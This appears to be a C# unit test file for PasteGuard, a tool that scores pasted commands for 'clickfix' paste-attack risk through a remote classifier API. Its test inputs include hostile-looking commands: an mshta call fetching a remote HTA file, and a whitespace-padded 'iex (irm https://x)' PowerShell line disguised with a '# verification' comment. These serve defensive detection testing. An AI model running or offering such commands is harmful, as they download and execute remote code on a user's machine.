using System.Net;
using System.Text.Json;
using PasteGuard;
using Xunit;

namespace PasteGuard.Tests;

public class JevClientTests
{
    private sealed class FakeHandler : HttpMessageHandler
    {
        private readonly Queue<(HttpStatusCode Code, string Body)> _responses;
        public List<(HttpRequestMessage Request, string Body)> Requests { get; } = new();

        public FakeHandler(params (HttpStatusCode, string)[] responses) => _responses = new(responses);

        protected override async Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
        {
            Requests.Add((request, await request.Content!.ReadAsStringAsync(ct)));
            var (code, body) = _responses.Dequeue();
            return new HttpResponseMessage(code) { Content = new StringContent(body) };
        }
    }

    private static string Answer(double noul) =>
        $"{{\"model\":\"jev-1.13.0\",\"answers\":{{\"clickfix\":{{\"type\":\"noul\",\"noul\":{noul.ToString(System.Globalization.CultureInfo.InvariantCulture)}}}}},\"usage\":{{\"input_tokens\":10,\"output_tokens\":1}}}}";

    [Theory]
    [InlineData(0.0, 0)]
    [InlineData(0.004, 0)]
    [InlineData(0.695, 70)]
    [InlineData(0.7, 70)]
    [InlineData(0.999, 100)]
    [InlineData(1.0, 100)]
    [InlineData(1.5, 100)]
    [InlineData(-0.2, 0)]
    public void Maps_probability_to_score(double p, int expected) =>
        Assert.Equal(expected, JevClient.ToScore(p));

    [Fact]
    public async Task Sends_expected_request_and_parses_score()
    {
        var handler = new FakeHandler((HttpStatusCode.OK, Answer(0.92)));
        using var client = new JevClient("https://api.example.test", handler);

        var score = await client.ScoreAsync("test-key", "jev-latest", "mshta http://x/a.hta");

        Assert.Equal(92, score);
        var (req, body) = Assert.Single(handler.Requests);
        Assert.Equal(HttpMethod.Post, req.Method);
        Assert.Equal("https://api.example.test/v1/systemone", req.RequestUri!.ToString());
        Assert.Equal("Bearer", req.Headers.Authorization!.Scheme);
        Assert.Equal("test-key", req.Headers.Authorization.Parameter);

        using var doc = JsonDocument.Parse(body);
        Assert.Equal("jev-latest", doc.RootElement.GetProperty("model").GetString());
        Assert.Equal("mshta http://x/a.hta", doc.RootElement.GetProperty("state").GetString());
        var q = doc.RootElement.GetProperty("questions").GetProperty("clickfix");
        Assert.Equal("noul", q.GetProperty("type").GetString());
        Assert.True(q.GetProperty("criteria").TryGetProperty("true", out _));
        Assert.True(q.GetProperty("criteria").TryGetProperty("false", out _));
    }

    [Fact]
    public async Task Retries_on_rate_limit()
    {
        var handler = new FakeHandler((HttpStatusCode.TooManyRequests, "{}"), (HttpStatusCode.OK, Answer(0.1)));
        using var client = new JevClient("https://api.example.test", handler);

        Assert.Equal(10, await client.ScoreAsync("k", "jev-latest", "cmd /c dir"));
        Assert.Equal(2, handler.Requests.Count);
    }

    [Fact]
    public async Task Bad_key_is_not_retried()
    {
        var handler = new FakeHandler((HttpStatusCode.Unauthorized, "{\"detail\":\"bad key\"}"));
        using var client = new JevClient("https://api.example.test", handler);

        var ex = await Assert.ThrowsAsync<JevException>(() => client.ScoreAsync("k", "jev-latest", "cmd /c dir"));
        Assert.Equal(401, ex.StatusCode);
        Assert.Single(handler.Requests);
    }

    [Fact]
    public async Task Missing_key_fails_without_network_call()
    {
        var handler = new FakeHandler();
        using var client = new JevClient("https://api.example.test", handler);

        await Assert.ThrowsAsync<JevException>(() => client.ScoreAsync("  ", "jev-latest", "cmd /c dir"));
        Assert.Empty(handler.Requests);
    }

    [Fact]
    public void Unexpected_response_throws() =>
        Assert.Throws<JevException>(() => JevClient.ParseScore("{\"answers\":{}}"));

    [Fact]
    public void Squashes_padding_before_sending()
    {
        var padded = "iex (irm https://x)" + new string(' ', 200) + "# verification";
        Assert.Equal("iex (irm https://x)    # verification", TextPrep.ForAnalysis(padded));
    }
}
